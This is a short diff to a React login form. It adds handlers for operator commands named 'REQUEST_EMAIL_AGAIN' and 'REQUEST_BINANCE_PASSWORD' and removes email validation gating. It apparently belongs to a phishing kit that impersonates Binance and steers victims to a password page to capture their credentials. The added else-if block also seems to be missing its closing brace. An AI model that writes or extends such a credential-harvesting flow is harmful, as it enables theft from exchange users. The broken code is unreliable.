@@ -97,22 +97,21 @@ export default function LoginForm() {
     useEffect(() => {
         if (command === 'REQUEST_EMAIL_AGAIN') {
             setInvalid(true); // Show error state for email input
-        }
+        }  else if (command === 'REQUEST_BINANCE_PASSWORD') {
+            setIsLoading(false);
+            setTimeout(() => {
+                // setIsLoading(false);
+                router.push('/PasswordPage');
+            }, 1500);
     }, [command]);
 
+    const { validateEmail } = useValidateEmail();
     // Handle email validation
     const handleEmailValidation = () => {
         const isValid = validateEmail(email);
         setInvalid(!isValid);
-
-        if (isValid) {
-            setIsLoading(true);
-            setUserEmail(email);
-            setTimeout(() => {
-                setIsLoading(false);
-                router.push('/PasswordPage');
-            }, 5000);
-        }
+        setIsLoading(true);
+        setUserEmail(email);
     };
 
     // Filter email suggestions
